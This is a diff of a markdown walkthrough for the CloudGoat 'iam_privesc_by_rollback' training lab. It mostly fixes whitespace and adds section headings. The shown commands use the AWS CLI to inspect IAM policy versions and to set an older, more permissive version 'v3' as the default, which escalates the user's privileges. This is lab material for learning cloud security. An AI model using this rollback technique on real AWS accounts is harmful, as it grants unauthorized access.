@@ -157,7 +157,7 @@ kali@kali:~/cloudgoat$ aws iam get-policy-version --policy-arn arn:aws:iam::0961
         "CreateDate": "2024-10-22T06:19:44+00:00"
     }
 }
-                                                                                                                                                                                                  
+
 kali@kali:~/cloudgoat$
 ```
 
@@ -187,8 +187,7 @@ kali@kali:~/cloudgoat$ aws iam get-policy-version --policy-arn arn:aws:iam::0961
         "CreateDate": "2024-10-22T06:19:47+00:00"
     }
 }
-                                                                                                                                                                                                  
-kali@kali:~/cloudgoat$
+                                                                                                                                          kali@kali:~/cloudgoat$
 ```
 
 ## Checking the policy "v3"
@@ -280,14 +279,14 @@ According to the information above, we can find out "v3" has strong permission w
             ]
 ```
 
-## 
+## Configure default policy to `v3`
 ```shell
 kali@kali:~/cloudgoat$ aws iam set-default-policy-version --policy-arn arn:aws:iam::096165652555:policy/cg-raynor-policy-iam_privesc_by_rollback_cgidi6arp6df8r --version-id v3 --profile raynor
-                                                                                                                                                                                                  
+
 kali@kali:~/cloudgoat$
 ```
 
-##
+## The default version id has been changed
 ```shell
 kali@kali:~/cloudgoat$ aws iam get-policy --policy-arn arn:aws:iam::096165652555:policy/cg-raynor-policy-iam_privesc_by_rollback_cgidi6arp6df8r --profile raynor
 {
@@ -306,6 +305,6 @@ kali@kali:~/cloudgoat$ aws iam get-policy --policy-arn arn:aws:iam::096165652555
         "Tags": []
     }
 }
-                                                                                                                                                                            
+
 kali@kali:~/cloudgoat$
 ```
